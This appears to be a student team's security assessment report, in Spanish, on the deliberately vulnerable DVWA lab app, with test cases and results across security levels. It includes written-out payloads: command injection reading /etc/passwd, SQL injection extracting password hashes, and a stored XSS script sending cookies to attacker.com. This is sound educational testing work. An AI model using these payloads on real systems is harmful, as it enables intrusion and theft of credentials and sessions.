# 🛡️ Reporte Final de Evaluación de Seguridad DVWA
**Team 21**  

---
**Herramientas Utilizadas:**
- Damn Vulnerable Web Application (DVWA) v1.10
- Docker para entorno aislado
- Python 3.x con librerías requests, BeautifulSoup
- Scripts automatizados personalizados
- Verificación manual exhaustiva

### 1. Configurar DVWA
```bash
# Iniciar DVWA con Docker
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Acceder a: http://localhost::8080/
# Login: admin / password
# Ir a Setup → Create/Reset Database
```
---

### 2. Ejecutar Pruebas
```bash
# Instalar dependencias
pip install requests beautifulsoup4

# Ejecutar script principal
python scripts/dvwa_security_tester_fixed.py
```
### 3. Verificación Manual
```bash
# Para casos específicos que requieren verificación
python scripts/dvwa_manual_verifier.py
```


## 📊 Resultados de las Pruebas

### Resumen de Vulnerabilidades por Nivel

| Vulnerabilidad | Low | Medium | High | Impossible |
|----------------|-----|---------|------|------------|
| **Command Injection** | 🔴 CRÍTICO<br/>100% vulnerable | 🟡 MEDIO<br/>Bypass con \| | 🟡 BAJO<br/>Filtros estrictos | 🟢 SEGURO<br/>Validación completa |
| **SQL Injection** | 🔴 CRÍTICO<br/>100% vulnerable | 🟡 MEDIO<br/>Algunos bypasses | 🟡 BAJO<br/>Filtros parciales | 🟢 SEGURO<br/>Prepared statements |
| **XSS Reflected** | 🔴 ALTO<br/>100% vulnerable | 🟡 MEDIO<br/>Filtros básicos | 🟡 BAJO<br/>Filtros avanzados | 🟢 SEGURO<br/>Codificación completa |
| **XSS Stored** | 🔴 CRÍTICO<br/>100% vulnerable | 🟡 MEDIO<br/>Filtros básicos | 🟡 BAJO<br/>Filtros avanzados | 🟢 SEGURO<br/>Sanitización completa |

### 5.2 Evaluación de Impacto

#### Escenarios de Ataque Real

**Command Injection (Nivel Low):**
```bash
# Escenario: Reconocimiento del sistema
Payload: 127.0.0.1; uname -a; cat /etc/passwd; ps aux

# Impacto Potencial:
- Información del sistema operativo
- Usuarios del sistema  
- Procesos en ejecución
- Posible escalamiento de privilegios
```

**SQL Injection (Nivel Low):**
```sql
-- Escenario: Extracción completa de usuarios
Payload: 1' UNION SELECT user, password FROM users --

-- Impacto Potencial:
- Nombres de usuario y hashes de contraseñas
- Acceso no autorizado a cuentas
- Compromiso de datos sensibles
- Posible compromiso administrativo
```

**XSS Stored (Nivel Low):**
```html
<!-- Escenario: Robo de sesiones -->
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>

<!-- Impacto Potencial: -->
- Robo de cookies de sesión
- Suplantación de identidad
- Acceso no autorizado a cuentas
- Propagación a otros usuarios
```

---

## 📋 7. CASOS DE PRUEBA COMPLETOS

### 7.1 Command Injection

#### TC-CI-001: Ejecución Básica de Comandos
```yaml
ID: TC-CI-001
Vulnerabilidad: Command Injection
Nivel: Low
Descripción: Verificar ejecución de comandos básicos del sistema
Precondiciones: 
  - DVWA configurado en nivel Low
  - Usuario logueado como admin
Pasos:
  1. Navegar a /vulnerabilities/exec/
  2. Ingresar "127.0.0.1; whoami" en campo IP
  3. Hacer clic en Submit
  4. Observar respuesta
Resultado Esperado: Sistema rechaza entrada maliciosa
Resultado Actual: Ejecuta comando y muestra "www-data"
Estado: ❌ VULNERABLE
Riesgo: CRÍTICO
Evidencia: comando_injection_low_whoami.png
```

#### TC-CI-002: Verificación de Seguridad Nivel Impossible
```yaml
ID: TC-CI-002
Vulnerabilidad: Command Injection
Nivel: Impossible  
Descripción: Verificar que nivel impossible bloquea inyección
Precondiciones:
  - DVWA configurado en nivel Impossible
  - Usuario logueado como admin
Pasos:
  1. Cambiar nivel de seguridad a Impossible
  2. Navegar a /vulnerabilities/exec/
  3. Ingresar "127.0.0.1; whoami" en campo IP
  4. Hacer clic en Submit
  5. Verificar respuesta
Resultado Esperado: Solo output de ping, sin comando adicional
Resultado Actual: ✅ Solo se ejecuta ping
Estado: ✅ SEGURO
Implementación: filter_var() + escapeshellarg()
Evidencia: comando_injection_impossible_blocked.png
```

### 7.2 SQL Injection

#### TC-SQL-001: Bypass de Autenticación
```yaml
ID: TC-SQL-001
Vulnerabilidad: SQL Injection
Nivel: Low
Descripción: Bypass de autenticación con OR clause
Payload: "1' OR '1'='1"
Resultado Esperado: Sistema rechaza entrada maliciosa
Resultado Actual: ❌ Muestra todos los usuarios (5 vs 1 normal)
Estado: VULNERABLE
Técnica: Boolean-based injection
Riesgo: CRÍTICO
```

#### TC-SQL-002: Verificación Nivel Impossible
```yaml
ID: TC-SQL-002  
Vulnerabilidad: SQL Injection
Nivel: Impossible
Descripción: Verificar protección con prepared statements
Payload: "1' OR '1'='1"
Resultado Esperado: Entrada rechazada o sanitizada
Resultado Actual: ✅ 0 usuarios mostrados consistentemente  
Estado: SEGURO
Implementación: is_numeric() + prepared statements
Verificación: 4 payloads diferentes, mismo resultado
```

### 7.3 Cross-Site Scripting

#### TC-XSS-001: XSS Reflejado Básico
```yaml
ID: TC-XSS-001
Vulnerabilidad: XSS Reflected
Nivel: Low
Payload: "<script>alert('XSS')</script>"
Método: GET parameter 'name'
Resultado: ❌ Script ejecutado en navegador
Estado: VULNERABLE
Impacto: Ejecución de JavaScript arbitrario
```

#### TC-XSS-002: XSS Almacenado
```yaml
ID: TC-XSS-002
Vulnerabilidad: XSS Stored  
Nivel: Low
Payload: "<img src='x' onerror='alert(\"Stored\")'>"
Método: POST en guestbook
Resultado: ❌ Payload almacenado y ejecutado
Estado: VULNERABLE  
Persistencia: ✅ Se ejecuta para todos los usuarios
Impacto: Compromiso persistente
```

--- 